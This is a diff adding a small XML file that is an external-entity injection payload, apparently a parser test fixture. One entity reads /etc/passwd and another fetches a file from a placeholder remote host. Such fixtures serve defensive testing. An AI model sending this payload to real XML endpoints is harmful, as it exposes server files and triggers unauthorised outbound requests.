@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<!DOCTYPE data SYSTEM "http://example.invalid/data.dtd" [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY remote SYSTEM "http://example.invalid/evil.txt">
+]>
+<data>&xxe; &remote;</data>
